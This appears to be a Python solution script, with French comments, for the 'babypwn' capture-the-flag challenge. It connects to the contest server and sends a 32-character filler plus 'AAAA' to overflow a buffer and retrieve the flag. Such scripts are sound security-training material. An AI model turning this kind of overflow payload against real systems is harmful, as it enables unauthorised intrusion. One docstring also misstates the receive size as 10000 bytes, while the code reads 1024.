import socket
import time

def creer_connection(serv: str, port: int):
    '''Renvoie une connexion sur le serveur via le port indiqués en paramètre.
    '''
    connexion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connexion.connect((serv, port))
    return connexion

def fermer_connexion(con):
    '''Ferme la connexion passée en paramètre
    '''
    con.close()

def envoyer_message(txt: str, con, deja_encode = False):
    '''Envoie un message sur une connexion ouverte, passés en paramètre.
    Renvoie alors la taille du message reçu par le serveur.
    :param:
    txt : texte à envoyer
    con : connexion ouverte
    deja_encode : booléen indiquant si le texte est déjà encodé ou non (False par défaut).
    '''
    if deja_encode:
        return con.send(txt)
    else:
        return con.send(txt.encode('utf-8'))
    
def recevoir_message(con):
    '''Renvoie un message de 10000 bytes maxi envoyé par le serveur sur la
    connexion passée en paramètre.
    '''
    return con.recv(1024).decode()


url = 'babypwn.wolvctf.io'
port = 1337

c = creer_connection(url, port)
txt = recevoir_message(c)
txt = recevoir_message(c)

rep = 'azertyuiopqsdfghjklmwxcvbnazerty'
assert len(rep) == 32
rep += 'AAAA\n'

envoyer_message(rep, c)
time.sleep(2)
txt = recevoir_message(c)
time.sleep(2)
txt = recevoir_message(c)
time.sleep(2)
txt = recevoir_message(c)
time.sleep(2)
txt = recevoir_message(c)
time.sleep(2)
txt = recevoir_message(c)

print(txt)

fermer_connexion(c)